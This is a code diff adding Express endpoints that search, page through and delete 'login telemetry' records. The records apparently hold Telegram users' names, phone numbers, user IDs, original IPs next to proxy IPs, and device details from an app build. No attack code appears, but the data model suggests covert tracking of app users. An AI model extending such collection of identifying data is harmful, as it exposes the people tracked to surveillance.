@@ -539,6 +539,107 @@ app.get('/api/telemetry/stats', verifyToken, async (req, res) => {
 });
 
 /**
+ * GET /api/telemetry/logins
+ * Server-side paginated and searched endpoint for Recent Logins
+ */
+app.get('/api/telemetry/logins', verifyToken, async (req, res) => {
+  try {
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 50;
+    const skip = (page - 1) * limit;
+    const search = req.query.search ? req.query.search.toLowerCase().trim() : '';
+
+    if (!search) {
+      const [total, rawDocs] = await Promise.all([
+        LoginTelemetry.countDocuments(),
+        LoginTelemetry.find()
+          .sort({ timestamp: -1 })
+          .skip(skip)
+          .limit(limit)
+          .lean()
+      ]);
+      return res.json({ total, data: rawDocs });
+    }
+
+    // Search path
+    const safeSearch = search.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+    const numericSearch = parseInt(search);
+    const searchMatch = {
+      $or: [
+        { 'telegram_user.first_name': { $regex: safeSearch, $options: 'i' } },
+        { 'telegram_user.last_name': { $regex: safeSearch, $options: 'i' } },
+        { 'telegram_user.phone_number': { $regex: safeSearch, $options: 'i' } },
+        { 'telegram_user.username': { $regex: safeSearch, $options: 'i' } },
+        { 'network_info.original_ip': { $regex: safeSearch, $options: 'i' } },
+        { 'network_info.active_proxy_ip': { $regex: safeSearch, $options: 'i' } },
+        { 'device_info.manufacturer': { $regex: safeSearch, $options: 'i' } },
+        { 'device_info.model': { $regex: safeSearch, $options: 'i' } },
+        { 'app_context.apk_version': { $regex: safeSearch, $options: 'i' } }
+      ]
+    };
+    if (!isNaN(numericSearch)) {
+      searchMatch.$or.push({ 'telegram_user.user_id': numericSearch });
+    }
+
+    const pipeline = [
+      { $match: searchMatch },
+      { $facet: {
+        metadata: [{ $count: 'total' }],
+        data: [
+          { $sort: { timestamp: -1 } },
+          { $skip: skip },
+          { $limit: limit }
+        ]
+      }}
+    ];
+
+    const results = await LoginTelemetry.aggregate(pipeline);
+    const total = results[0].metadata[0] ? results[0].metadata[0].total : 0;
+    res.json({ total, data: results[0].data });
+  } catch (error) {
+    console.error('Logins Pagination Error:', error);
+    res.status(500).json({ error: 'Internal Server Error' });
+  }
+});
+
+/**
+ * DELETE /api/telemetry/logins
+ * Deletes login telemetry records based on a date range.
+ */
+app.delete('/api/telemetry/logins', verifyToken, async (req, res) => {
+  try {
+    const range = req.query.range || 'all';
+    let query = {};
+    const now = new Date();
+
+    if (range === 'yesterday') {
+      const cutoff = new Date(now);
+      cutoff.setDate(cutoff.getDate() - 1);
+      cutoff.setHours(0, 0, 0, 0);
+      query = { timestamp: { $lt: cutoff } };
+    } else if (range === 'week') {
+      const cutoff = new Date(now);
+      cutoff.setDate(cutoff.getDate() - 7);
+      cutoff.setHours(0, 0, 0, 0);
+      query = { timestamp: { $lt: cutoff } };
+    } else if (range === 'month') {
+      const cutoff = new Date(now);
+      cutoff.setMonth(cutoff.getMonth() - 1);
+      cutoff.setHours(0, 0, 0, 0);
+      query = { timestamp: { $lt: cutoff } };
+    }
+
+    const result = await LoginTelemetry.deleteMany(query);
+    console.log(`Deleted ${result.deletedCount} login records (range: ${range})`);
+    res.json({ status: 'deleted', count: result.deletedCount, range });
+  } catch (error) {
+    console.error('Delete Logins Error:', error);
+    res.status(500).json({ error: 'Internal Server Error' });
+  }
+});
+
+
+/**
  * DELETE /api/telemetry/network
  * Deletes network telemetry records based on a date range.
  * Query params: range = 'all' | 'yesterday' | 'week' | 'month'
